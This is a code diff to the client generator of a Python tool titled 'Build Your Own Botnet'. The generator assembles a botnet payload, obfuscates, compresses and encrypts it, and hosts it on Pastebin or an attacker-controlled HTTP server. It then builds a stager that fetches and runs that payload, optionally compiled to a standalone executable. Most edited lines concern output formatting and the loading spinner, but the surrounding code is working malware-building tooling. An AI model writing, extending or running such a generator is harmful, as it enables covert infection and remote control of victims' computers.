@@ -1,7 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Client Generator (Build Your Own Botnet)'
-__doc__ = """ 
+"""Client Generator (Build Your Own Botnet)
 
 Generate clients with the following features:
 
@@ -80,13 +79,9 @@ try:
 except: pass
 
 # loading animation
-from core.util import spinner
-__load__ = threading.Event()
-__load__.set()
-#__spin__ = spinner(__load__)
-
-# modules
-from core import generators, security, util
+import core.util as util
+import core.security as security
+import core.generators as generators
 
 # main
 def main():
@@ -167,11 +162,9 @@ def progress_update(input, output, task=None):
 
     """
     diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
-    __load__.clear()
     util.display("    [+]", color='green', style='bright', end=',')
     util.display(" ".join([task if task else "", "Complete" if len(str(task).split()) <= 1 else ""]), color='reset', style='bright')
     util.display("\t({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80 - len("[+] ")), style='dim', color='reset')
-    __load__.set()
 
 def run(options):
     """ 
@@ -183,17 +176,16 @@ def run(options):
     Saves the output file to the ./byob/modules/payloads folder
 
     """
-    from core import generators, security, util
     key     = base64.b64encode(os.urandom(16))
     var     = generators.variable(3)
     imports = set()
 
     # modules
-    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display("\n[>]", color='yellow', style='bright', end=',')
     util.display('Modules', color='reset', style='bright')
     modules = ['core/remoteimport.py','core/util.py','core/security.py','core/payload.py']
     for m in modules:
-        util.display('\tadding {}...'.format(os.path.splitext(m)[0].replace('/','.')), color='reset', style='dim')
+        util.display('    adding {}...'.format(os.path.splitext(m)[0].replace('/','.')), color='reset', style='dim')
     if len(options.modules):
         for m in options.modules:
 	    if isinstance(m, str):
@@ -209,7 +201,7 @@ def run(options):
                 modules.append(module)
 
     # imports
-    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display("\n[>]", color='yellow', style='bright', end=',')
     util.display("Imports", color='reset', style='bright')
     for module in modules:
         for line in open(module, 'r').read().splitlines():
@@ -223,28 +215,34 @@ def run(options):
     util.display("{} Imports Complete".format(len(list(imports))), color='reset', style='dim')
                  
     # payload
-    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display("\n[>]", color='yellow', style='bright', end=',')
     util.display("Payload", color='reset', style='dim')
-    payload = '\n'.join(['#!/usr/bin/env python'] + list(imports) + [open(module,'r').read().partition('# main')[2] for module in modules]) + generators.snippet('main', 'Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
+    payload = '\n'.join(list(imports) + [open(module,'r').read().partition('# main')[2] for module in modules]) + generators.snippet('main', 'Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
 
     if options.obfuscate:
-        util.display("\n\tObfuscating payload...", color='reset', style='dim')
-        output  = generators.obfuscate(payload)
+        __load__= threading.Event()
+        util.display("\n    Obfuscating payload...", color='reset', style='dim', end=',')
+        __spin__= util.spinner(__load__)
+        output  = '\n'.join([line for line in generators.obfuscate(payload).rstrip().replace('mport time,threading,functools','').splitlines() if '=jobs' not in line])
+        __load__.set()
         progress_update(payload, output, task='Obfuscation')
         payload = output
 
     if options.compress:
-        util.display("\n\tCompressing payload...", color='reset', style='dim')
+        util.display("\n    Compressing payload... ", color='reset', style='dim', end=',')
         output  = generators.compress(payload)
         progress_update(payload, output, task='Compression')
         payload = output
 
     if options.encrypt:
-        util.display("\n\tEncrypting payload...".format(key), color='reset', style='dim')
+        util.display("\n    Encrypting payload... ".format(key), color='reset', style='dim', end=',')
         output  = generators.encrypt(payload, key)
         progress_update(payload, output, task='Encryption')
         payload = output
 
+    # upload
+    util.display("\n[>]", color='yellow', style='bright', end=',')
+    util.display("Upload", color='reset', style='dim')
     if options.pastebin:
         url = util.pastebin(payload, api_dev_key=options.pastebin)
     else:
@@ -256,33 +254,28 @@ def run(options):
 	path = os.path.join(os.path.abspath(dirname), var + '.py' )
         with file(path, 'w') as fp:
             fp.write(payload)
-        url = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.strip(os.getcwd())))
-        s   = urllib2.urlparse.urlsplit(url)
+        s = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.strip(os.getcwd())))
+        s = urllib2.urlparse.urlsplit(s)
         url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment))
-
-    util.display("    [+]", color='green', style='bright', end='')
+        if url.endswith('.p'):
+            url += 'y'
+    util.display("    [+]", color='green', style='bright', end=',')
     util.display("Upload Complete", color='reset', style='bright')
-    util.display("\t\t(hosting payload at: {}".format(url), color='reset', style='dim')
+    util.display("\t(hosting payload at: {}".format(url), color='reset', style='dim')
 
     # stager
-    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display("\n[>]", color='yellow', style='bright', end=',')
     util.display("Stager", color='reset', style='dim')
-    stager  = open('core/stager.py', 'r').read() + generators.snippet('main', 'run', url=url, key=key)
+    stager = open('core/stager.py', 'r').read() + generators.snippet('main', 'run', url=url, key=key)
 
     if options.obfuscate:
-        util.display("\n\tObfuscating stager...", color='reset', style='dim')
+        util.display("\n    Obfuscating stager... ", color='reset', style='dim', end=',')
         output = generators.obfuscate(stager)
         progress_update(stager, output, task='Obfuscation')
         stager = output
-    ''' 
-    if options.compress:
-        util.display("\n\tCompressing stager...", color='reset', style='dim')
-        output = generators.compress(stager)
-        progress_update(stager, output, task='Compression')
-        stager = output
-    '''
+
     # client
-    util.display("[>]", color='yellow', style='bright', end=',')
+    util.display("\n[>]", color='yellow', style='bright', end=',')
     util.display("Client", color='reset', style='bright')
     client = 'byob_{}.py'.format(var) if not options.name else options.name
     if not client.endswith('.py'):
@@ -301,8 +294,7 @@ def run(options):
             output = generators.exe(options, client)
             progress_update(stager, open(output, 'rb').read(), task='Compiled Standalone Executable')
             client = output
-        util.display( "    (saved to file: {})".format(os.path.abspath(client)).ljust(80 - len("    [+]")), style='dim', color='reset')
-    __load__.clear()
+        util.display("    (saved to file: {})".format(os.path.abspath(client)).ljust(80 - len("    [+]")), style='dim', color='reset')
     return client
 
 if __name__ == '__main__':
